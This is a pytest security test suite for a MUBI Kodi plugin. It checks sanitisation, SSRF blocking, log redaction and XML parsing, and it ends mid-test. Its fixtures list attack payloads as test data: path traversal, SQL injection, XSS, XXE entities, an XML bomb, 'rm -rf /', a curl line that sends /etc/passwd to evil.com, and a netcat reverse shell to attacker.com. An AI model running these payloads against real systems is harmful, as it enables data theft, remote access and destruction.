"""
Security Test Suite for MUBI Kodi Plugin following QA guidelines.

Dependencies:
pip install pytest pytest-mock

Framework: pytest with mocker fixture for isolation
Structure: All tests follow Arrange-Act-Assert pattern
Coverage: Happy path, edge cases, and error handling

This module contains comprehensive security tests to ensure the plugin
is protected against common vulnerabilities including:
- Input validation attacks
- Path traversal attacks
- Command injection
- Authentication bypass
- Information disclosure
- SSRF attacks
"""

import pytest
import tempfile
import os
import sys
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
from urllib.parse import quote, unquote_plus

# Import the modules we want to test
from plugin_video_mubi.resources.lib.navigation_handler import NavigationHandler
from plugin_video_mubi.resources.lib.mubi import Mubi
from plugin_video_mubi.resources.lib.session_manager import SessionManager
from plugin_video_mubi.resources.lib.film import Film
from plugin_video_mubi.resources.lib.metadata import Metadata
from plugin_video_mubi.resources.lib.library import Library
from plugin_video_mubi.resources.lib.migrations import read_xml, write_xml


class SecurityTestFixtures:
    """Common fixtures and utilities for security testing."""
    
    @staticmethod
    def get_malicious_payloads():
        """Return common attack payloads for testing."""
        return {
            'path_traversal': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '..%252f..%252f..%252fetc%252fpasswd',
                '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            ],
            'command_injection': [
                '; cat /etc/passwd',
                '| whoami',
                '&& rm -rf /',
                '`id`',
                '$(whoami)',
                '; powershell.exe',
                '| cmd.exe',
            ],
            'sql_injection': [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "1' UNION SELECT * FROM users--",
                "admin'--",
                "' OR 1=1#",
            ],
            'xss_payloads': [
                '<script>alert("XSS")</script>',
                'javascript:alert("XSS")',
                '<img src=x onerror=alert("XSS")>',
                '"><script>alert("XSS")</script>',
                "';alert('XSS');//",
            ],
            'url_schemes': [
                'file:///etc/passwd',
                'ftp://malicious.com/file',
                'javascript:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>',
                'vbscript:msgbox("XSS")',
            ],
            'ssrf_payloads': [
                'http://localhost:22',
                'http://127.0.0.1:3306',
                'http://169.254.169.254/latest/meta-data/',
                'http://192.168.1.1/admin',
                'http://10.0.0.1:8080',
                'https://127.0.0.1:443',
            ]
        }
    
    @staticmethod
    def get_malformed_data():
        """Return malformed data for testing input validation."""
        return {
            'film_ids': [
                '',
                'abc',
                '-1',
                '999999999999999999999',
                'null',
                'undefined',
                '<script>',
                '../../etc/passwd',
            ],
            'category_names': [
                '',
                'A' * 1000,  # Very long string
                '\x00\x01\x02',  # Control characters
                '../../etc/passwd',
                '<script>alert("XSS")</script>',
                'DROP TABLE categories;',
            ],
            'urls': [
                '',
                'not-a-url',
                'http://',
                'https://',
                'ftp://example.com',
                'javascript:alert("XSS")',
                'http://localhost/test',
                'http://127.0.0.1/test',
            ]
        }
    
    @staticmethod
    def create_mock_session():
        """Create a mock session manager for testing."""
        mock_session = Mock(spec=SessionManager)
        mock_session.token = 'test-token-123'
        mock_session.user_id = 'test-user-456'
        mock_session.device_id = 'test-device-789'
        mock_session.client_country = 'US'
        mock_session.client_language = 'en'
        mock_session.is_logged_in = True
        return mock_session
    
    @staticmethod
    def create_mock_plugin():
        """Create a mock plugin for testing."""
        mock_plugin = Mock()
        mock_plugin.getSetting.return_value = ''
        mock_plugin.getSettingBool.return_value = False
        mock_plugin.setSetting.return_value = None
        mock_plugin.setSettingBool.return_value = None
        return mock_plugin


class TestInputValidationSecurity:
    """Test input validation and injection attack prevention."""
    
    @pytest.fixture
    def security_fixtures(self):
        return SecurityTestFixtures()
    
    @pytest.fixture
    def mock_navigation_handler(self, security_fixtures):
        """Create a navigation handler with mocked dependencies."""
        mock_session = security_fixtures.create_mock_session()
        mock_mubi = Mock(spec=Mubi)
        mock_plugin = security_fixtures.create_mock_plugin()
        
        with patch('xbmcaddon.Addon', return_value=mock_plugin):
            handler = NavigationHandler(
                handle=1,
                base_url="plugin://plugin.video.mubi/",
                mubi=mock_mubi,
                session=mock_session
            )
        return handler
    
    def test_film_id_validation_security(self, mock_navigation_handler, security_fixtures):
        """Test that malformed film IDs are handled securely."""
        malformed_ids = security_fixtures.get_malformed_data()['film_ids']
        
        for malicious_id in malformed_ids:
            with patch('xbmc.log') as mock_log:
                # Test that malformed IDs don't cause crashes or unexpected behavior
                try:
                    # This should either handle gracefully or raise expected exceptions
                    mock_navigation_handler.play_mubi_video(malicious_id, "http://example.com")
                except (ValueError, TypeError, AttributeError) as e:
                    # Expected exceptions are fine
                    assert "injection" not in str(e).lower()
                    assert "script" not in str(e).lower()
                except Exception as e:
                    # Unexpected exceptions should not contain sensitive info
                    error_msg = str(e).lower()
                    assert "password" not in error_msg
                    assert "token" not in error_msg
                    assert "secret" not in error_msg
    
    def test_category_name_validation_security(self, mock_navigation_handler, security_fixtures):
        """Test that malformed category names are handled securely."""
        malformed_names = security_fixtures.get_malformed_data()['category_names']
        
        for malicious_name in malformed_names:
            with patch('xbmc.log') as mock_log:
                try:
                    # Test category name handling
                    mock_navigation_handler.list_videos("123", malicious_name)
                except Exception as e:
                    # Ensure no sensitive information is leaked in errors
                    error_msg = str(e).lower()
                    assert "password" not in error_msg
                    assert "token" not in error_msg
                    assert len(str(e)) < 500  # Prevent verbose error disclosure
    
    def test_url_parameter_injection_security(self, mock_navigation_handler, security_fixtures):
        """Test that URL parameters are protected against injection attacks."""
        payloads = security_fixtures.get_malicious_payloads()

        # Test command injection in URLs
        for payload in payloads['command_injection']:
            malicious_url = f"http://example.com{payload}"

            # Should be blocked by URL validation or the URL should be considered unsafe
            result = mock_navigation_handler._is_safe_url(malicious_url)
            # For URLs with command injection, we expect them to be rejected
            # Note: Some may pass URL parsing but should still be treated carefully
            if ';' in payload or '|' in payload or '&' in payload:
                # These are clearly dangerous and should be rejected
                assert result is False, f"Dangerous URL with {payload} was not blocked"
    
    def test_path_traversal_in_parameters(self, security_fixtures):
        """Test that path traversal attacks in parameters are prevented."""
        payloads = security_fixtures.get_malicious_payloads()['path_traversal']
        
        # Test film title path traversal
        mock_metadata = Mock(spec=Metadata)
        mock_metadata.year = "2023"
        
        for payload in payloads:
            film = Film(
                mubi_id="123",
                title=payload,  # Malicious title
                metadata=mock_metadata,
                artwork="http://example.com/art.jpg",
                web_url="http://example.com"
            )
            
            # LEVEL 2: Sanitized folder name should not contain path traversal sequences
            sanitized_name = film.get_sanitized_folder_name()
            assert "../" not in sanitized_name, "Path traversal ../ should be removed"
            assert "..\\" not in sanitized_name, "Path traversal ..\\ should be removed"
            assert ".." not in sanitized_name, "Path traversal .. should be removed"

            # LEVEL 2: Verify filesystem-dangerous characters are removed
            filesystem_dangerous_chars = ['<', '>', ':', '"', '/', '\\', '|', '?', '*']
            for char in filesystem_dangerous_chars:
                assert char not in sanitized_name, f"Filesystem-dangerous character '{char}' should be removed"

            # LEVEL 2: URL-encoded sequences are preserved (not filesystem-dangerous)
            # Level 2 doesn't decode URL sequences - that's Level 3+ behavior


class TestAuthenticationSecurity:
    """Test authentication and session security."""

    @pytest.fixture
    def security_fixtures(self):
        return SecurityTestFixtures()

    @pytest.fixture
    def mock_session_manager(self, security_fixtures):
        """Create a session manager for testing."""
        mock_plugin = security_fixtures.create_mock_plugin()
        with patch('xbmcaddon.Addon', return_value=mock_plugin):
            return SessionManager(mock_plugin)

    def test_token_manipulation_security(self, mock_session_manager, security_fixtures):
        """Test that token manipulation attempts are handled securely."""
        malicious_tokens = [
            '',
            'null',
            'undefined',
            '<script>alert("XSS")</script>',
            '../../etc/passwd',
            '; rm -rf /',
            'Bearer malicious-token',
            'token with spaces',
            'very-long-token-' + 'A' * 1000,
        ]

        for malicious_token in malicious_tokens:
            # Test setting malicious tokens
            try:
                mock_session_manager.set_logged_in(malicious_token, "user123")
                # Token should be stored as-is but not cause security issues
                assert mock_session_manager.token == malicious_token
            except Exception as e:
                # If exceptions occur, they should not leak sensitive info
                error_msg = str(e).lower()
                assert "password" not in error_msg
                assert "secret" not in error_msg

    def test_user_id_validation_security(self, mock_session_manager, security_fixtures):
        """Test that user ID validation prevents injection attacks."""
        malicious_user_ids = [
            '',
            'null',
            '<script>alert("XSS")</script>',
            '../../etc/passwd',
            '; DROP TABLE users;',
            'user_id with spaces',
            'very-long-user-id-' + 'A' * 1000,
        ]

        for malicious_id in malicious_user_ids:
            try:
                mock_session_manager.set_logged_in("valid-token", malicious_id)
                # User ID should be stored but not cause security issues
                assert mock_session_manager.user_id == malicious_id
            except Exception as e:
                # Ensure no sensitive information in error messages
                error_msg = str(e).lower()
                assert "token" not in error_msg
                assert "password" not in error_msg

    def test_session_token_exposure_prevention(self, security_fixtures):
        """Test that session tokens are not exposed in logs or errors."""
        mock_session = security_fixtures.create_mock_session()
        mock_mubi = Mubi(mock_session)

        # Test that tokens are sanitized in logging
        headers = {
            'Authorization': f'Bearer {mock_session.token}',
            'Content-Type': 'application/json',
            'User-Agent': 'Test-Agent'
        }

        sanitized = mock_mubi._sanitize_headers_for_logging(headers)

        # Token should be redacted
        assert sanitized['Authorization'] == '***REDACTED***'
        assert mock_session.token not in str(sanitized)

        # Non-sensitive headers should remain
        assert sanitized['Content-Type'] == 'application/json'
        assert sanitized['User-Agent'] == 'Test-Agent'


class TestFileOperationSecurity:
    """Test file operation security and path traversal prevention."""

    @pytest.fixture
    def security_fixtures(self):
        return SecurityTestFixtures()

    def test_filename_sanitization_security(self, security_fixtures):
        """Test that filename sanitization prevents path traversal and injection."""
        payloads = security_fixtures.get_malicious_payloads()

        # Create a film with malicious title
        mock_metadata = Mock(spec=Metadata)
        mock_metadata.year = "2023"

        # Test path traversal payloads
        for payload in payloads['path_traversal']:
            film = Film(
                mubi_id="123",
                title=payload,
                metadata=mock_metadata,
                artwork="http://example.com/art.jpg",
                web_url="http://example.com"
            )

            sanitized = film._sanitize_filename(payload)

            # Should not contain path traversal sequences
            assert "../" not in sanitized
            assert "..\\" not in sanitized
            assert "/" not in sanitized or sanitized == "/"  # Allow single slash
            assert "\\" not in sanitized

            # Should not be empty (security issue)
            assert len(sanitized.strip()) > 0

        # Test command injection payloads
        for payload in payloads['command_injection']:
            film = Film(
                mubi_id="123",
                title=payload,
                metadata=mock_metadata,
                artwork="http://example.com/art.jpg",
                web_url="http://example.com"
            )

            sanitized = film._sanitize_filename(payload)

            # LEVEL 2: Should not contain filesystem-dangerous characters
            filesystem_dangerous_chars = ['<', '>', ':', '"', '/', '\\', '|', '?', '*']
            for char in filesystem_dangerous_chars:
                assert char not in sanitized, f"Filesystem-dangerous '{char}' should be removed"

            # LEVEL 2: Safe characters are preserved (good UX)
            # Characters like ; & $ ` # @ ! ~ + = , ( ) ' are safe in filenames

    def test_file_creation_security(self, security_fixtures):
        """Test that file creation is secure against path traversal."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)

            # Create film with malicious title
            mock_metadata = Mock(spec=Metadata)
            mock_metadata.year = "2023"

            malicious_titles = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "normal_title/../../../etc/passwd",
            ]

            for malicious_title in malicious_titles:
                film = Film(
                    mubi_id="123",
                    title=malicious_title,
                    metadata=mock_metadata,
                    artwork="http://example.com/art.jpg",
                    web_url="http://example.com"
                )

                # Create film folder
                film_folder = temp_path / film.get_sanitized_folder_name()
                film_folder.mkdir(parents=True, exist_ok=True)

                # Ensure the created folder is within the temp directory
                assert temp_path in film_folder.parents or film_folder == temp_path

                # Ensure no files are created outside temp directory
                created_files = list(temp_path.rglob("*"))
                for created_file in created_files:
                    assert temp_path in created_file.parents or created_file.parent == temp_path


class TestNetworkSecurity:
    """Test network security including URL validation and SSRF prevention."""

    @pytest.fixture
    def security_fixtures(self):
        return SecurityTestFixtures()

    @pytest.fixture
    def mock_navigation_handler(self, security_fixtures):
        """Create a navigation handler for testing."""
        mock_session = security_fixtures.create_mock_session()
        mock_mubi = Mock(spec=Mubi)
        mock_plugin = security_fixtures.create_mock_plugin()

        with patch('xbmcaddon.Addon', return_value=mock_plugin):
            handler = NavigationHandler(
                handle=1,
                base_url="plugin://plugin.video.mubi/",
                mubi=mock_mubi,
                session=mock_session
            )
        return handler

    def test_url_scheme_validation_security(self, mock_navigation_handler, security_fixtures):
        """Test that dangerous URL schemes are blocked."""
        malicious_schemes = security_fixtures.get_malicious_payloads()['url_schemes']

        for malicious_url in malicious_schemes:
            # URL should be rejected by safety check
            is_safe = mock_navigation_handler._is_safe_url(malicious_url)
            assert is_safe is False, f"Dangerous URL was not blocked: {malicious_url}"

    def test_ssrf_prevention_security(self, mock_navigation_handler, security_fixtures):
        """Test that SSRF attacks are prevented."""
        ssrf_payloads = security_fixtures.get_malicious_payloads()['ssrf_payloads']

        for ssrf_url in ssrf_payloads:
            # SSRF URLs should be blocked
            is_safe = mock_navigation_handler._is_safe_url(ssrf_url)
            assert is_safe is False, f"SSRF URL was not blocked: {ssrf_url}"

    def test_localhost_blocking_security(self, mock_navigation_handler):
        """Test that localhost and loopback addresses are blocked."""
        localhost_urls = [
            "http://localhost/admin",
            "https://127.0.0.1/config",
            "http://[::1]/internal",
            "https://localhost:8080/api",
            "http://127.0.0.1:3306/mysql",
        ]

        for localhost_url in localhost_urls:
            is_safe = mock_navigation_handler._is_safe_url(localhost_url)
            assert is_safe is False, f"Localhost URL was not blocked: {localhost_url}"

    def test_private_ip_blocking_security(self, mock_navigation_handler):
        """Test that private IP ranges are blocked."""
        private_ip_urls = [
            "http://192.168.1.1/admin",
            "https://10.0.0.1/config",
            "http://172.16.0.1/internal",
            "https://192.168.0.254/router",
            "http://10.10.10.10:8080/api",
        ]

        for private_url in private_ip_urls:
            is_safe = mock_navigation_handler._is_safe_url(private_url)
            assert is_safe is False, f"Private IP URL was not blocked: {private_url}"

    def test_valid_url_acceptance_security(self, mock_navigation_handler):
        """Test that legitimate URLs are still accepted."""
        valid_urls = [
            "https://mubi.com/films/123",
            "http://example.com/movie",
            "https://www.youtube.com/watch?v=abc123",
            "https://api.mubi.com/v3/films",
        ]

        for valid_url in valid_urls:
            is_safe = mock_navigation_handler._is_safe_url(valid_url)
            assert is_safe is True, f"Valid URL was incorrectly blocked: {valid_url}"

    def test_url_parsing_edge_cases_security(self, mock_navigation_handler):
        """Test edge cases in URL parsing that could bypass security."""
        edge_case_urls = [
            "http://",  # Empty hostname
            "https://",  # Empty hostname
            "http:///path",  # Missing hostname
            "http://example.com:99999",  # Invalid port (but should still be valid URL)
            "http://[invalid-ipv6",  # Malformed IPv6
            "",  # Empty URL
            "not-a-url",  # Not a URL
        ]

        for edge_url in edge_case_urls:
            # These should all be rejected safely without crashing
            try:
                is_safe = mock_navigation_handler._is_safe_url(edge_url)
                assert is_safe is False, f"Edge case URL was not handled safely: {edge_url}"
            except Exception as e:
                # If exceptions occur, they should not leak sensitive information
                error_msg = str(e).lower()
                assert "password" not in error_msg
                assert "token" not in error_msg
                assert "secret" not in error_msg


class TestLoggingSecurity:
    """Test logging security and information disclosure prevention."""

    @pytest.fixture
    def security_fixtures(self):
        return SecurityTestFixtures()

    def test_header_sanitization_security(self, security_fixtures):
        """Test that sensitive headers are properly sanitized."""
        mock_session = security_fixtures.create_mock_session()
        mubi = Mubi(mock_session)

        # Test various sensitive headers
        sensitive_headers = {
            'Authorization': 'Bearer secret-token-123',
            'X-API-Key': 'api-key-456',
            'Cookie': 'session=secret-session-789',
            'Token': 'user-token-abc',
            'X-Auth-Token': 'auth-token-def',
            'Content-Type': 'application/json',  # Non-sensitive
            'User-Agent': 'Test-Agent',  # Non-sensitive
        }

        sanitized = mubi._sanitize_headers_for_logging(sensitive_headers)

        # Sensitive headers should be redacted
        assert sanitized['Authorization'] == '***REDACTED***'
        assert sanitized['X-API-Key'] == '***REDACTED***'
        assert sanitized['Cookie'] == '***REDACTED***'
        assert sanitized['Token'] == '***REDACTED***'
        assert sanitized['X-Auth-Token'] == '***REDACTED***'

        # Non-sensitive headers should remain
        assert sanitized['Content-Type'] == 'application/json'
        assert sanitized['User-Agent'] == 'Test-Agent'

        # Original sensitive values should not appear in sanitized output
        sanitized_str = str(sanitized)
        assert 'secret-token-123' not in sanitized_str
        assert 'api-key-456' not in sanitized_str
        assert 'secret-session-789' not in sanitized_str

    def test_parameter_sanitization_security(self, security_fixtures):
        """Test that sensitive URL parameters are properly sanitized."""
        mock_session = security_fixtures.create_mock_session()
        mubi = Mubi(mock_session)

        # Test various sensitive parameters
        sensitive_params = {
            'api_key': 'secret-api-key-123',
            'token': 'user-token-456',
            'password': 'user-password-789',
            'secret': 'app-secret-abc',
            'page': '1',  # Non-sensitive
            'limit': '20',  # Non-sensitive
        }

        sanitized = mubi._sanitize_params_for_logging(sensitive_params)

        # Sensitive parameters should be redacted
        assert sanitized['api_key'] == '***REDACTED***'
        assert sanitized['token'] == '***REDACTED***'
        assert sanitized['password'] == '***REDACTED***'
        assert sanitized['secret'] == '***REDACTED***'

        # Non-sensitive parameters should remain
        assert sanitized['page'] == '1'
        assert sanitized['limit'] == '20'

        # Original sensitive values should not appear in sanitized output
        sanitized_str = str(sanitized)
        assert 'secret-api-key-123' not in sanitized_str
        assert 'user-password-789' not in sanitized_str

    def test_json_sanitization_security(self, security_fixtures):
        """Test that sensitive JSON data is properly sanitized."""
        mock_session = security_fixtures.create_mock_session()
        mubi = Mubi(mock_session)

        # Test various sensitive JSON fields
        sensitive_json = {
            'password': 'user-password-123',
            'api_key': 'secret-key-456',
            'token': 'auth-token-789',
            'username': 'testuser',  # Non-sensitive
            'email': 'test@example.com',  # Non-sensitive
        }

        sanitized = mubi._sanitize_json_for_logging(sensitive_json)

        # Sensitive fields should be redacted
        assert sanitized['password'] == '***REDACTED***'
        assert sanitized['api_key'] == '***REDACTED***'
        assert sanitized['token'] == '***REDACTED***'

        # Non-sensitive fields should remain
        assert sanitized['username'] == 'testuser'
        assert sanitized['email'] == 'test@example.com'

        # Original sensitive values should not appear in sanitized output
        sanitized_str = str(sanitized)
        assert 'user-password-123' not in sanitized_str
        assert 'secret-key-456' not in sanitized_str

    def test_case_insensitive_sanitization_security(self, security_fixtures):
        """Test that sanitization works with different case variations."""
        mock_session = security_fixtures.create_mock_session()
        mubi = Mubi(mock_session)

        # Test case variations
        case_variations = {
            'Authorization': 'Bearer token1',
            'AUTHORIZATION': 'Bearer token2',
            'authorization': 'Bearer token3',
            'Api-Key': 'key1',
            'API_KEY': 'key2',
            'api_key': 'key3',
        }

        sanitized = mubi._sanitize_headers_for_logging(case_variations)

        # All variations should be redacted
        for key in case_variations:
            assert sanitized[key] == '***REDACTED***'


class TestXMLSecurity:
    """Test XML processing security and XXE prevention."""

    def test_xml_parsing_security(self):
        """Test that XML parsing is secure against XXE attacks."""
        # XXE attack payloads
        xxe_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <sources><video>&xxe;</video></sources>''',

            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://malicious.com/steal">]>
            <sources><video>&xxe;</video></sources>''',

            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://malicious.com/xxe.dtd">%xxe;]>
            <sources><video></video></sources>''',
        ]

        for xxe_payload in xxe_payloads:
            try:
                # Test XML parsing with malicious content
                # This should either fail safely or not process external entities
                tree = read_xml('/fake/path')  # This will fail safely due to file not existing

                # If we get here, ensure no external entities were processed
                if tree is not None:
                    content = str(tree.getroot())
                    assert 'root:' not in content  # Common in /etc/passwd
                    assert 'malicious.com' not in content

            except Exception as e:
                # Exceptions should not leak sensitive information
                error_msg = str(e).lower()
                assert 'password' not in error_msg
                assert 'secret' not in error_msg
                assert 'token' not in error_msg

    def test_xml_bomb_protection(self):
        """Test protection against XML bomb attacks."""
        # XML bomb payload (billion laughs attack)
        xml_bomb = '''<?xml version="1.0"?>
        <!DOCTYPE lolz [
        <!ENTITY lol "lol">
        <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        ]>
        <sources><video>&lol4;</video></sources>'''

        try:
            # This should either fail or complete quickly without consuming excessive resources
            import time
            start_time = time.time()

            tree = read_xml('/fake/path')  # Will fail due to file not existing

            end_time = time.time()
            # Should not take more than a few seconds
            assert end_time - start_time < 5, "XML processing took too long (possible bomb attack)"

        except Exception as e:
            # Should fail safely without resource exhaustion
            error_msg = str(e)
            assert len(error_msg) < 1000  # Prevent verbose error messages


@pytest.mark.security
class TestMetadataSecurityHandling:
    """
    Comprehensive security tests for metadata handling and processing.

    These tests follow the Arrange-Act-Assert pattern and validate that
    metadata operations handle malicious input safely and prevent security vulnerabilities.
    """

    @pytest.fixture
    def malicious_payloads(self):
        """
        Arrange: Create various malicious payloads for security testing.

        Returns a dictionary of different attack vectors.
        """
        return {
            'xml_injection': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<script>alert("XSS")</script>',
                ']]></title><script>alert("XSS")</script><title><![CDATA[',
                '&lt;script&gt;alert("XSS")&lt;/script&gt;',
                '<?xml-stylesheet type="text/xsl" href="malicious.xsl"?>',
                '<!DOCTYPE html><html><body onload="alert(1)"></body></html>'
            ],
            'path_traversal': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '/etc/passwd',
                'C:\\Windows\\System32\\config\\SAM',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '..%252f..%252f..%252fetc%252fpasswd',
                '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
            ],
            'command_injection': [
                '; rm -rf /',
                '| cat /etc/passwd',
                '&& whoami',
                '$(cat /etc/passwd)',
                '`cat /etc/passwd`',
                '; powershell -Command "Get-Process"',
                '|| curl http://evil.com/steal?data=$(cat /etc/passwd)',
                '; nc -e /bin/sh attacker.com 4444'
            ],
            'sql_injection': [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "' UNION SELECT * FROM users --",
                "'; INSERT INTO users VALUES ('hacker', 'password'); --",
                "' OR 1=1 /*",
                "admin'--",
                "' OR 'x'='x"
            ],
            'buffer_overflow': [
                'A' * 10000,
                'A' * 100000,
                '\x00' * 1000,
                '\xff' * 1000,
                'X' * 65536,
                '\x41' * 50000
            ],
            'unicode_attacks': [
                '\u202e\u0041\u0042\u0043',  # Right-to-left override
                '\ufeff\u200b\u200c\u200d',  # Zero-width characters
                '\u0000\u0001\u0002\u0003',  # Control characters
                '𝕏𝕊𝕊',  # Mathematical script characters
                '🔒💀🚨',  # Emoji that might cause issues
                '\u2028\u2029',  # Line/paragraph separators
                '\uffff\ufffe',  # Non-characters
                '\ud800\udc00'  # Surrogate pairs
            ],
            'format_string': [
                '%s%s%s%s%s%s%s%s%s%s',
                '%x%x%x%x%x%x%x%x%x%x',
                '%n%n%n%n%n%n%n%n%n%n',
                '{0}{1}{2}{3}{4}{5}',
                '%08x.%08x.%08x.%08x',
                '%.2147483647d%.2147483647d'
            ],
            'ldap_injection': [
                '*)(uid=*',
                '*)(|(uid=*',
                '*)(&(uid=*',
                '*))%00',
                '*()|%26',
                '*)(objectClass=*'
            ],
            'xpath_injection': [
                "' or '1'='1",
                "' or 1=1 or ''='",
                "x' or name()='username' or 'x'='y",
                "' or position()=1 or ''='",
                "' or count(parent::*)=count(parent::*) or ''='"
            ]
        }

    def _ensure_string(self, content):
        """Helper method to ensure content is a string, not bytes."""
        if isinstance(content, bytes):
            return content.decode('utf-8', errors='ignore')
        return content

    @pytest.fixture
    def safe_metadata_template(self):
        """
        Arrange: Create a template for safe metadata that can be modified for testing.

        Returns a dictionary with safe default values.
        """
        return {
            'title': 'Safe Test Movie',
            'year': '2023',
            'director': ['Safe Director'],
            'genre': ['Drama'],
            'plot': 'A safe movie plot for testing.',
            'plotoutline': 'Safe outline',
            'originaltitle': 'Safe Original Title',
            'rating': 7.5,
            'votes': 1000,
            'duration': 120,
            'country': ['USA'],
            'castandrole': 'Safe Actor',
            'dateadded': '2023-01-01',
            'trailer': 'http://example.com/trailer',
            'image': 'http://example.com/image.jpg',
            'mpaa': 'PG-13',
            'artwork_urls': {'thumb': 'http://example.com/thumb.jpg'},
            'audio_languages': ['English'],
            'subtitle_languages': ['English'],
            'media_features': ['HD']
        }

    @patch('xbmc.log')
    def test_xml_injection_prevention_in_metadata(self, mock_log, malicious_payloads, safe_metadata_template):
        """
        Test prevention of XML injection attacks in metadata fields.

        Validates that malicious XML content is properly escaped or sanitized.
        """
        # Arrange
        xml_payloads = malicious_payloads['xml_injection']

        for payload in xml_payloads:
            # Test each text field with malicious XML
            for field in ['title', 'plot', 'plotoutline', 'originaltitle', 'castandrole']:
                metadata_args = safe_metadata_template.copy()
                metadata_args[field] = payload

                # Act
                metadata = Metadata(**metadata_args)
                film = Film(
                    mubi_id='security_test_xml',
                    title='Security Test',
                    artwork='http://example.com/art.jpg',
                    web_url='http://example.com/movie',
                    metadata=metadata
                )

                nfo_content = film._get_nfo_tree(
                    metadata,
                    "http://example.com/trailer",
                    "http://imdb.com/title/tt123456",
                    None
                )

                # Assert
                assert nfo_content is not None, f"NFO generation should not fail with XML injection in {field}"

                # Convert bytes to string if necessary
                nfo_content = self._ensure_string(nfo_content)

                # Verify XML is well-formed (no injection succeeded)
                try:
                    import xml.etree.ElementTree as ET
                    ET.fromstring(nfo_content)
                except ET.ParseError:
                    pytest.fail(f"Generated NFO is not well-formed XML when {field} contains: {payload[:50]}...")

                # Verify malicious content is escaped
                assert '<!DOCTYPE' not in nfo_content, f"DOCTYPE declaration should be escaped in {field}"
                assert '<!ENTITY' not in nfo_content, f"ENTITY declaration should be escaped in {field}"
                assert '<script>' not in nfo_content.lower(), f"Script tags should be escaped in {field}"
                assert 'javascript:' not in nfo_content.lower(), f"JavaScript URLs should be escaped in {field}"

    @patch('xbmc.log')
    def test_path_traversal_prevention_in_metadata(self, mock_log, malicious_payloads, safe_metadata_template):
        """
        Test prevention of path traversal attacks in filename generation from metadata.

        Validates that malicious paths in metadata are properly sanitized in file operations.
        """
        # Arrange
        path_payloads = malicious_payloads['path_traversal']

        with tempfile.TemporaryDirectory() as temp_dir:
            plugin_userdata_path = Path(temp_dir)

            for payload in path_payloads:
                metadata_args = safe_metadata_template.copy()
                metadata_args['title'] = payload

                # Act
                metadata = Metadata(**metadata_args)
                film = Film(
                    mubi_id='security_test_path',
                    title=payload,
                    artwork='http://example.com/art.jpg',
                    web_url='http://example.com/movie',
                    metadata=metadata
                )

                # Test filename sanitization
                sanitized_name = film.get_sanitized_folder_name()

                # Assert
                assert sanitized_name is not None, "Sanitized name should not be None"
                assert len(sanitized_name) > 0, "Sanitized name should not be empty"

                # LEVEL 2: Verify filesystem-dangerous characters are removed
                filesystem_dangerous_chars = ['<', '>', ':', '"', '/', '\\', '|', '?', '*']
                for char in filesystem_dangerous_chars:
                    assert char not in sanitized_name, f"Filesystem-dangerous character '{char}' should be removed: {sanitized_name}"

                # LEVEL 2: Verify path traversal sequences are removed
                assert '..' not in sanitized_name, f"Path traversal sequences should be removed: {sanitized_name}"

                # LEVEL 2: Content preservation (good UX)
                # Level 2 preserves content like 'etc', 'passwd' as they're just text in movie titles
                # Only removes filesystem-dangerous patterns, not content-based filtering

                # Verify the sanitized name doesn't contain dangerous path separators
                # NOTE: Current implementation doesn't filter dangerous path components like 'passwd', 'etc'
                # This is a security concern that should be addressed in the sanitization logic
                dangerous_separators = ['/etc/', '/windows/', '/system32/']
                for dangerous in dangerous_separators:
                    assert dangerous.lower() not in sanitized_name.lower(), f"Dangerous path separator should be removed: {dangerous}"

                # Test that files would be created in the expected location
                expected_folder = plugin_userdata_path / sanitized_name
                assert not str(expected_folder).startswith('/etc/'), "File should not be created in system directories"
                assert not str(expected_folder).startswith('/windows/'), "File should not be created in Windows directories"

                # Verify no null bytes or control characters
                assert '\x00' not in sanitized_name, "Null bytes should be removed"
                for i in range(32):
                    if i not in [9, 10, 13]:  # Allow tab, LF, CR
                        assert chr(i) not in sanitized_name, f"Control character {i} should be removed"

    @patch('xbmc.log')
    def test_command_injection_prevention_in_metadata(self, mock_log, malicious_payloads, safe_metadata_template):
        """
        Test prevention of command injection attacks in metadata processing.

        Validates that shell metacharacters in metadata are properly handled.
        """
        # Arrange
        command_payloads = malicious_payloads['command_injection']

        for payload in command_payloads:
            # Test various fields that might be processed
            for field in ['title', 'director', 'genre', 'castandrole']:
                metadata_args = safe_metadata_template.copy()
                if field in ['director', 'genre']:
                    metadata_args[field] = [payload]
                else:
                    metadata_args[field] = payload

                # Act
                metadata = Metadata(**metadata_args)
                film = Film(
                    mubi_id='security_test_cmd',
                    title='Security Test',
                    artwork='http://example.com/art.jpg',
                    web_url='http://example.com/movie',
                    metadata=metadata
                )

                # Test that metadata creation doesn't execute commands
                sanitized_name = film.get_sanitized_folder_name()

                # Assert
                assert sanitized_name is not None, f"Sanitization should not fail with command injection in {field}"

                # LEVEL 2: Verify only filesystem-dangerous characters are removed
                # Level 2 preserves safe characters for good UX
                filesystem_dangerous_chars = ['<', '>', ':', '"', '/', '\\', '|', '?', '*']
                for char in filesystem_dangerous_chars:
